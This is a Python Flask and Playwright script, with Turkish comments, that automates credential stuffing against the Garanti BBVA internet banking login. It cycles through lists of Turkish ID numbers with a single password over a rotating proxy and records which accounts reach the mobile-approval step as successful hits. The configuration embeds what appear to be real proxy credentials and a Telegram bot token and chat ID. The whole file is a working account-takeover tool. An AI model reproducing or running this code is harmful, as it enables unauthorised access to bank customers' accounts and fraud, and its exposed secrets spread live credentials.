import os, asyncio, math, requests
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO
from playwright.async_api import async_playwright

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# Bot Ayarları
CONFIG = {
    "url": "https://sube.garantibbva.com.tr/isube/login/login/passwordentrypersonal-tr",
    "proxy": {"server": "http://gw.dataimpulse.com:823", "username": "bfa46317aef5ab052141__cr.tr", "password": "f95867774f1e8481"},
    "telegram_token": "8227836330:AAGDgPLPs2DIdusrL9WTNiURZZkBW758xFc",
    "telegram_chat": "-1003373347143"
}

is_running = False
results = []

async def bot_logic(tcs, password, threads):
    global is_running
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, proxy=CONFIG["proxy"])
        
        async def work(list_part):
            for tc in list_part:
                if not is_running: break
                ctx = await browser.new_context()
                page = await ctx.new_page()
                await page.route("**/*", lambda r: r.abort() if r.request.resource_type in ["image", "stylesheet", "font"] else r.continue_())
                try:
                    socketio.emit('log', {'m': f'>>> Deneniyor: {tc}'})
                    await page.goto(CONFIG["url"], wait_until="domcontentloaded", timeout=40000)
                    await page.fill('input[name="musteriNoLabelUstte"]', tc)
                    await page.fill('input[name="parolaLabelUstte"]', password)
                    await page.click('#formSubmit')
                    
                    await asyncio.sleep(5) # Sayfanın oturması için kısa bekleme
                    content = await page.content()
                    
                    if "Telefonunuza gönderilen mobil bildirimi onaylamanız" in content:
                        socketio.emit('log', {'m': f'[+] BAŞARILI: {tc}'})
                        socketio.emit('success', {'tc': tc})
                        results.append(f"{tc}:{password}")
                    elif "İşleminize devam edilemiyor" in content:
                        socketio.emit('log', {'m': f'[-] HATALI: {tc}'})
                    else:
                        socketio.emit('log', {'m': f'[?] BELİRSİZ: {tc}'})
                except: socketio.emit('log', {'m': f'[!] HATA: {tc}'})
                await ctx.close()

        chunk = math.ceil(len(tcs)/threads)
        await asyncio.gather(*[work(tcs[i*chunk:(i+1)*chunk]) for i in range(threads)])
        await browser.close()
        is_running = False

@app.route('/')
def index(): return render_template('index.html')

@app.route('/action', methods=['POST'])
def action():
    global is_running
    data = request.json
    if data['op'] == 'start' and not is_running:
        is_running = True
        tcs = data['tcs'].split('\n')
        asyncio.run(bot_logic([t.strip() for t in tcs if t], data['pw'], int(data['th'])))
    else: is_running = False
    return jsonify({"ok": True})

if __name__ == '__main__': socketio.run(app, port=5000)